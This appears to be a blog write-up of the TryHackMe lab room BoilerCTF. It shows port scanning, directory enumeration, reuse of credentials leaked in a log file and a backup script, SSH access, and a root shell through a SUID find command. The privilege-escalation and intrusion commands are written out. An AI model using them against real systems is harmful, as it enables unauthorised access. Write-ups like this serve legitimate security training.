---
layout: post
mermaid: true
title: "BoilerCTF"
date: 2026-08-09
categories: [ctf, web, privesc]
tags: [joomla, sar2html, suid, directory-enumeration, privilege-escalation]
---

## Overview

| | |
|---|---|
| **Platform** | TryHackMe |
| **Difficulty** | Medium |
| **URL** | <a href="https://tryhackme.com/room/boilerctf2" target="_blank">https://tryhackme.com/room/boilerctf2</a> |
| **Focus** | Discovering forgotten third-party applications and exploiting misconfigurations through directory enumeration |

BoilerCTF is a medium-difficulty room that teaches the importance of methodical enumeration and wordlist selection. Rather than exploiting Joomla itself, the path to initial access goes through a forgotten third-party tool left in production — a common real-world scenario. The room also contains deliberate misdirection to test your ability to distinguish signal from noise.

---

## Reconnaissance

I started with a full port scan to identify what services were running:

```bash
nmap -sS -sC -sV -O -Pn -p 21,80,10000,55007 <TARGET_IP>

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
```

The scan revealed four open ports. At this point, I noted:
- **FTP (21)** with anonymous access enabled — I checked it but found no useful information
- **HTTP (80)** running Apache with what appeared to be a Joomla installation
- **Webmin (10000)** — a known service, but not exploitable in this context
- **SSH (55007)** on a non-standard port — clearly the intended access vector once credentials were obtained

---

## Enumeration and Discovery

I focused on the HTTP port since that's typically where the most exploitable surface area exists. Let me first identify what's running:

```bash
curl -s http://<TARGET_IP>/joomla/ | grep -i "joomla"

Joomla 3.9.12-dev detected
```

Joomla 3.9.12 is relatively old but not directly exploitable. I needed to find what else was in the application directory. Rather than running a massive wordlist that would timeout, I started with a curated wordlist (`common.txt`, ~4.6k words) to identify quick wins:

```bash
feroxbuster -u http://<TARGET_IP>/joomla/ -w /usr/share/wordlists/dirb/common.txt \
  -x html,php,txt,js,json,bak,old,new,jpg --extract-links --scan-limit 2 \
  --filter-status 401,403,404,405,500 --scan-dir-listings

301 http://<TARGET_IP>/joomla/_test/
```

The `_test/` directory stood out immediately — a classic sign of development artifacts left in production. Inside, I found **sar2html**, a System Activity Report graphing tool completely unrelated to Joomla core. More importantly, I discovered a file named `log.txt` that was directly accessible:

```bash
curl http://<TARGET_IP>/joomla/_test/log.txt

Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.
Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 1.2.3.4 port 49824 ssh2 #pass: superduperp@$$
Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)
```

Bingo — plaintext credentials in a log file. This is the kind of mistake that happens when administrators assume "hidden" equals "secure."

---

## Initial Access via SSH

With credentials in hand, I connected to SSH on the non-standard port:

```bash
ssh basterd@<TARGET_IP> -p 55007
# password: superduperp@$$

$ id
uid=1001(basterd) gid=1001(basterd) groups=1001(basterd)

$ ls -la /home/basterd
-rwxr-xr-x 1 stoner  basterd  699 Aug 21  2019 backup.sh
```

I was in as `basterd`, a low-privileged user. The home directory was mostly empty except for one interesting file: `backup.sh`, owned by user `stoner`. This is a classic setup for privilege escalation — a script with hardcoded credentials in a comment or header.

---

## Privilege Escalation Chain

Let me read that backup script:

```bash
cat /home/basterd/backup.sh

REMOTE=1.2.3.4
SOURCE=/home/stoner
TARGET=/usr/local/backup
LOG=/home/stoner/bck.log

DATE=`date +%y\.%m\.%d\.`
USER=stoner
#superduperp@$$no1knows
ssh $USER@$REMOTE mkdir $TARGET/$DATE
[... rest of script ...]
```

The comment on line with `#superduperp@$$no1knows` contains the password for the `stoner` user — same pattern as the SSH log, just a different credential. I escalated:

```bash
su stoner
# password: superduperp@$$no1knows

$ id
uid=1000(stoner) gid=1000(stoner) groups=1000(stoner),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

Now I'm `stoner`. To reach root, I checked what `stoner` can do:

```bash
sudo -l
User stoner may run the following commands on Vulnerable:
    (root) NOPASSWD: /NotThisTime/MessinWithYa
```

The binary `/NotThisTime/MessinWithYa` doesn't exist — another deliberate troll by the room author. The real vector is a SUID binary I found after running enumeration:

```bash
find / -perm -4000 2>/dev/null | grep find

/usr/bin/find
```

The `find` binary has the SUID bit set. According to GTFOBins, I can abuse this to spawn a shell with the owner's privileges:

```bash
find . -exec /bin/sh -p \; -quit

# id
uid=1000(stoner) gid=1000(stoner) euid=0(root) groups=1000(stoner),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)

# whoami
root
```

The `euid=0` confirms I'm running as root. No flags are discussed here.

---

## Attack Flow

<div class="mermaid">
graph TD
    A["Reconnaissance<br/>nmap 4 ports identified"] --> B["HTTP Service<br/>Joomla 3.9.12 detected"]
    B --> C["Directory Enumeration<br/>feroxbuster with common.txt"]
    C --> D["sar2html Discovery<br/>Forgotten third-party tool"]
    D --> E["Credential Extraction<br/>log.txt accessible via HTTP"]
    E --> F["SSH Access<br/>basterd user on port 55007"]
    F --> G["backup.sh Analysis<br/>stoner credentials found"]
    G --> H["User Escalation<br/>su stoner"]
    H --> I["SUID Binary Discovery<br/>find binary with setuid"]
    I --> J["Shell Execution<br/>find -exec spawns sh"]
    J --> K["Root Access Achieved"]
</div>

---

## Key Takeaways

**Wordlist Selection is Strategic** — A 220k-word list generates millions of requests and often times out without finding short, critical paths. A curated 4.6k-word list found the vulnerable directory immediately. For future rooms, I'll run a quick scan with `common.txt` in parallel with larger lists.

**Forgotten Development Tools Are Real Attack Surface** — Security teams often focus on core framework patches, but third-party tools installed during development and never removed become maintenance holes. Joomla 3.9.12 itself wasn't exploitable; the vulnerability was the abandoned `sar2html` application.

**Plaintext Credentials in Logs and Scripts** — Administrators routinely leave credentials in log files and backup scripts, assuming "out of sight" means secure. Reviewing readable files with broad permissions is essential reconnaissance — in this case, a log file accessible via HTTP gave up initial access directly.

